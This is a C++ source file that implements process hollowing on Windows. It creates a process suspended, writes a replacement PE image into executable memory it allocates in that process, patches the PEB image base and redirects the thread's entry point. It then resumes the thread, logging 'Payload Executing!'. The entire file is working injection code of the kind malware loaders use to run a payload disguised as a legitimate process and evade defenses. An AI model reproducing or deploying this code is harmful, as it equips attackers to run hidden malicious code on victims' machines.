#include "headers.h"

PROCESS_INFORMATION procInfo;

BOOL HollowProc(char *proc, char *replace, wchar_t curDirPath)
{
	BOOL state = TRUE;
	STARTUPINFOA startupInfo = {sizeof(startupInfo)};

	if (!CreateProcessA(nullptr, proc, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInfo, &procInfo))
	{
		warn("CreateProcessA failed! 0x%lx", GetLastError());
		return FALSE;
	}

	HANDLE hFile = CreateFileA(replace, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		warn("CreateFileA Failed to open the existing file. Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	SIZE_T replaceSize = GetFileSize(hFile, NULL) + (1 << 17);

	PVOID vallocAddress = VirtualAllocEx(procInfo.hProcess, nullptr, replaceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!vallocAddress)
	{
		warn("VirtualAllocEx FAILED! Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}
	okay("Address is inside the target process.");
	info("\n\t|\n\t| ADDRESS\t| 0x%p\n\t|____________________________________\n\n", vallocAddress);

	ULONG oldSize, newSize;
	ULONG64 oldImgBase, newImgBase = (ULONG64)vallocAddress;

	BOOL rebaseResult = ReBaseImage64(replace, "", TRUE, FALSE, FALSE, 0, &oldSize, &oldImgBase, &newSize, &newImgBase, 0);
	if (!rebaseResult)
	{
		warn("ReBaseImage64 FAILED! Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	HANDLE hMapFile = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
	if (!hMapFile)
	{
		warn("CreateFileMapping FAILED. Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	CloseHandle(hFile);

	PVOID mappedAddress = MapViewOfFileEx(hMapFile, FILE_MAP_READ, 0, 0, 0, vallocAddress);
	if (!mappedAddress)
	{
		warn("MapViewOfFileEx FAILED! Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	auto dosHeader = (PIMAGE_DOS_HEADER)mappedAddress;
	auto nt = (PIMAGE_NT_HEADERS)((BYTE *)mappedAddress + dosHeader->e_lfanew);
	auto sections = (PIMAGE_SECTION_HEADER)(nt + 1);

	SIZE_T bytes = 0;

	BOOL status = WriteProcessMemory(procInfo.hProcess, (PVOID)vallocAddress, (PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfHeaders, &bytes);
	if (!status)
	{
		warn("WriteProcessMemory FAILED! Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++)
	{
		PVOID targetAddress = (PBYTE)vallocAddress + sections[i].VirtualAddress;
		PVOID sourceAddress = (PVOID)(sections[i].PointerToRawData + nt->OptionalHeader.ImageBase);

		status = WriteProcessMemory(procInfo.hProcess, targetAddress, sourceAddress, sections[i].SizeOfRawData, &bytes);
		if (!status)
		{
			warn("WriteProcessMemory FAILED! Error: 0x%lx", GetLastError());
			state = FALSE;
			return Cleanup(state);
		}
	}

	PROCESS_BASIC_INFORMATION pbi;
	NTSTATUS NtStatus = NtQueryInformationProcess(procInfo.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
	if (NtStatus != STATUS_SUCCESS)
	{
		warn("NtQueryInformationProcess FAILED! Error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	PVOID peb = pbi.PebBaseAddress;
	status = WriteProcessMemory(procInfo.hProcess, (PBYTE)peb + sizeof(PVOID) * 2, &nt->OptionalHeader.ImageBase, sizeof(PVOID), &bytes);
	if (!status)
	{
		warn("WriteProcessMemory FAILED! error: 0x%lx", GetLastError());
		state = FALSE;
		return Cleanup(state);
	}

	CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(procInfo.hThread, &context);
#ifdef _WIN64
	// x64
	context.Rcx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)vallocAddress);
#else
	// x86
	context.Ebx = (DWORD)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD)vallocAddress);
#endif
	SetThreadContext(procInfo.hThread, &context);
	info("\n\t|\n\t| PID\t| %d\n\t|____________________________________\n\n", procInfo.dwProcessId);
	UnmapViewOfFile(mappedAddress);
	ResumeThread(procInfo.hThread);
	CloseHandle(procInfo.hThread);
	CloseHandle(procInfo.hProcess);
	info("Thread Resumed\n\t\t      \\-------->Payload Executing!");
	return state;
}

BOOL Cleanup(BOOL state)
{
	if (procInfo.hProcess)
	{
		if (!TerminateProcess(procInfo.hProcess, 0))
		{
			warn("Failed to terminate the process! Error: 0x%lx", GetLastError());
			state = FALSE;
		}
		else
		{
			okay("Terminated Process SUCCESS!");
		}
	}

	return state;
}
